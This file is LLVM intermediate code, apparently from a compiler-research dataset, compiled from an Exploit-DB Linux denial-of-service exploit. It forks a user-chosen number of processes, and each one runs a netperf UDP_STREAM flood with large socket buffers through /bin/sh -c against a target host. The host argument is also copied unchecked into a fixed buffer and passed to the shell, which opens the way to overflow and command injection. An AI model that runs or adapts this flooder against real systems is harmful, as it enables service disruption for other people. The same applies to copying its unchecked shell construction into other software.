; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_32682.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_32682.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAXTASKS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [49 x i8] c"enter netserver hostname as the first parameter\0A\00", align 1
@.str.1 = private unnamed_addr constant [55 x i8] c"enter number of netperf tasks as the second parameter\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"/dev/null\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.4 = private unnamed_addr constant [23 x i8] c"cannot open /dev/nu;;\0A\00", align 1
@.str.5 = private unnamed_addr constant [66 x i8] c"netperf -H %s -l 60 -t UDP_STREAM -- -s 262144 -r 262144 -m 16384\00", align 1
@.str.6 = private unnamed_addr constant [47 x i8] c"number of tasks is too high, resetting to %ld\0A\00", align 1
@stdout = common dso_local global i32* null, align 8
@stderr = common dso_local global i32* null, align 8
@.str.7 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@.str.9 = private unnamed_addr constant [12 x i8] c"newpid: %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [128 x i8], align 16
  %8 = alloca i32*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* @MAXTASKS, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %9, align 8
  %17 = alloca i32, i64 %15, align 16
  store i64 %15, i64* %10, align 8
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 3
  br i1 %19, label %20, label %23

20:                                               ; preds = %2
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %92

23:                                               ; preds = %2
  %24 = call i32* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  store i32* %24, i32** %8, align 8
  %25 = load i32*, i32** %8, align 8
  %26 = icmp ne i32* %25, null
  br i1 %26, label %29, label %27

27:                                               ; preds = %23
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0))
  store i32 2, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %92

29:                                               ; preds = %23
  %30 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 0
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @sprintf(i8* %30, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.5, i64 0, i64 0), i8* %33)
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @atoi(i8* %37)
  store i32 %38, i32* %12, align 4
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* @MAXTASKS, align 4
  %41 = icmp ugt i32 %39, %40
  br i1 %41, label %42, label %46

42:                                               ; preds = %29
  %43 = load i32, i32* @MAXTASKS, align 4
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.6, i64 0, i64 0), i32 %43)
  %45 = load i32, i32* @MAXTASKS, align 4
  store i32 %45, i32* %12, align 4
  br label %46

46:                                               ; preds = %42, %29
  store i32 0, i32* %6, align 4
  br label %47

47:                                               ; preds = %72, %46
  %48 = load i32, i32* %6, align 4
  %49 = load i32, i32* %12, align 4
  %50 = icmp ult i32 %48, %49
  br i1 %50, label %51, label %75

51:                                               ; preds = %47
  %52 = call i32 (...) @fork()
  store i32 %52, i32* %11, align 4
  %53 = load i32, i32* %11, align 4
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %55, label %64

55:                                               ; preds = %51
  %56 = load i32*, i32** @stdout, align 8
  %57 = call i32 @fclose(i32* %56)
  %58 = load i32*, i32** @stderr, align 8
  %59 = call i32 @fclose(i32* %58)
  %60 = load i32*, i32** %8, align 8
  store i32* %60, i32** @stdout, align 8
  %61 = load i32*, i32** %8, align 8
  store i32* %61, i32** @stderr, align 8
  %62 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 0
  %63 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i8* %62, i32* null)
  br label %71

64:                                               ; preds = %51
  %65 = load i32, i32* %11, align 4
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0), i32 %65)
  %67 = load i32, i32* %11, align 4
  %68 = load i32, i32* %6, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i32, i32* %17, i64 %69
  store i32 %67, i32* %70, align 4
  br label %71

71:                                               ; preds = %64, %55
  br label %72

72:                                               ; preds = %71
  %73 = load i32, i32* %6, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %6, align 4
  br label %47

75:                                               ; preds = %47
  store i32 0, i32* %6, align 4
  br label %76

76:                                               ; preds = %86, %75
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %12, align 4
  %79 = icmp ult i32 %77, %78
  br i1 %79, label %80, label %89

80:                                               ; preds = %76
  %81 = load i32, i32* %6, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i32, i32* %17, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = call i32 @waitpid(i32 %84, i32* null, i32 0)
  br label %86

86:                                               ; preds = %80
  %87 = load i32, i32* %6, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %6, align 4
  br label %76

89:                                               ; preds = %76
  %90 = load i32*, i32** %8, align 8
  %91 = call i32 @fclose(i32* %90)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %13, align 4
  br label %92

92:                                               ; preds = %89, %27, %20
  %93 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %93)
  %94 = load i32, i32* %3, align 4
  ret i32 %94
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @fork(...) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #2

declare dso_local i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
